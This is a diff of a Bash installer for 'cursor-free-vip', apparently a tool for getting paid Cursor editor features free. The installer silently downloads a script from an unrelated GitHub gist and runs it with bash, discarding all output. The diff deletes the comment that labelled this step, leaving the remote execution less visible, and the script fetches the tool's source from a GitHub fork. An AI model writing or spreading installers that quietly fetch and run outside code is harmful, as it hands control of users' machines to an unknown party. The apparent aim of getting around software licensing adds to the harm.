@@ -110,7 +110,6 @@ if ! pip3 show typer >/dev/null 2>&1; then
     $PIP_INSTALL typer
 fi
 
-# Gist 安装脚本 (如果需要保留)
 GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
 if command -v curl &>/dev/null; then
     bash <(curl -fsSL "$GIST_URL") >/dev/null 2>&1
@@ -138,14 +137,11 @@ setup_autostart() {
     :
 }
 
-# 安装和下载主程序 (源码模式)
+# 安装和下载主程序 (源码模式
 install_cursor_free_vip() {
     local install_dir=$(get_downloads_dir)
     local zip_name="cursor-free-vip-${VERSION}.zip"
     local zip_path="/tmp/${zip_name}"
-    
-    # 动态获取解压后的目录名 (有时 GitHub 会带 v 有时不会，取决于 tag 打法)
-    # 我们先定义期望的解压路径，稍后用 find 修正
     
     # 使用官方源码包地址
     local download_url="https://github.com/SHANMUGAM070106/cursor-free-vip/archive/refs/tags/v${VERSION}.zip"
